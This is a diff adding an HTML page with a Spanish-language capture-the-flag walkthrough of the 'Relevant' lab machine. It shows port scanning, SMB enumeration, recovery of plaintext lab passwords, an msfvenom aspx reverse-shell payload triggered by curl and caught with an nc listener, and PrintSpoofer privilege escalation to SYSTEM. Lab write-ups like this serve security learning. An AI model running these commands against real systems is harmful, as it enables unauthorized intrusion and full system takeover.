@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Relevant</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        line-height: 1.6;
+        margin: 20px;
+    }
+
+    h1 {
+        color: #0047ab;
+    }
+
+    h2 {
+        color: #0081ab;
+    }
+
+    code {
+        background-color: #f4f4f4;
+        padding: 2px 6px;
+        border-radius: 3px;
+    }
+
+    img {
+        max-width: 100%;
+        height: auto;
+        margin-bottom: 10px;
+    }
+
+    pre {
+        background-color: #f4f4f4;
+        padding: 10px;
+        border-radius: 5px;
+        overflow-x: auto;
+    }
+
+</style>
+</head>
+<body>
+    <div style="margin-left: 20%; margin-right: 20%;">
+        <h1># Relevant</h1>
+
+        <h2>## Nmap</h2>
+        <img src="image.png" alt="alt text">
+        <img src="image-1.png" alt="alt text">
+
+        <h2>### Nmap SMB</h2>
+        <img src="image-5.png" alt="alt text">
+
+        <h2>## Threader3000</h2>
+        <p>Permite ver los puertos abiertos</p>
+        <pre>
+            threader3000
+        </pre>
+        <img src="image-10.png" alt="alt text">
+
+        <h2>Fuzzing</h2>
+        <pre>
+            gobuster dir -u http://10.10.48.117 -w Desktop/common.txt -x php 
+        </pre>
+        <img src="image-2.png" alt="alt text">
+
+        <h2>Enum4linux</h2>
+        <img src="image-4.png" alt="alt text">
+
+        <h2>SMB</h2>
+        <pre>
+            smbmap -H 10.10.48.117
+        </pre>
+        <img src="image-3.png" alt="alt text">
+
+        <pre>
+            smbclient -L 10.10.48.117
+        </pre>
+        <img src="image-6.png" alt="alt text">
+
+        <p>Entramos en el usuario y descargamos el archivo <code>passwords.txt</code></p>
+        <pre>
+            smbclient //10.10.48.117/nt4wrksv -N
+        </pre>
+        <img src="image-7.png" alt="alt text">
+
+        <p>Contenido del archivo</p>
+        <img src="image-8.png" alt="alt text">
+
+        <p>Decodificamos usando CyberChef</p>
+        <img src="image-9.png" alt="alt text">
+
+        <pre>
+            Bob - !P@$$W0rD!123
+            Bill - Juw4nnaM4n420696969!$$$
+        </pre>
+
+        <p>Tenemos acceso web al archivo subido en SMB</p>
+        <img src="image-11.png" alt="alt text">
+
+        <p>Creamos una aspx reverse shell, para subirla al servidor</p>
+        <pre>
+            msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.67.209 LPORT=53 -f aspx -o pwn.aspx
+        </pre>
+        <img src="image-12.png" alt="alt text">
+
+        <p>Subimos el archivo</p>
+        <img src="image-13.png" alt="alt text">
+
+        <p>Nos conectamos a la reverse shell</p>
+        <pre>
+            curl http://10.10.179.154:49663/nt4wrksv/pwn.aspx
+
+            nc -nvlp 53
+        </pre>
+        <img src="image-15.png" alt="alt text">
+        <img src="image-14.png" alt="alt text">
+
+        <p>Buscamos el archivo <code>user.txt</code></p>
+        <img src="image-16.png" alt="alt text">
+
+        <p>Vemos nuestros privilegios</p>
+        <img src="image-17.png" alt="alt text">
+
+        <p>Encontramos <code>SeImpersonatePrivilege</code>, existe un exploit que nos permite explotar esta vulnerabilidad</p>
+
+        <p>Clonamos el siguiente repositorio</p>
+        <pre>
+            git clone https://github.com/dievus/printspoofer.git
+        </pre>
+
+        <p>Subimos el <code>.exe</code> al servidor samba</p>
+        <img src="image-18.png" alt="alt text">
+
+        <p>Lo ejecutamos y ya seremos <code>nt authority\system</code></p>
+        <img src="image-19.png" alt="alt text">
+    </div>
+</body>
+</html>
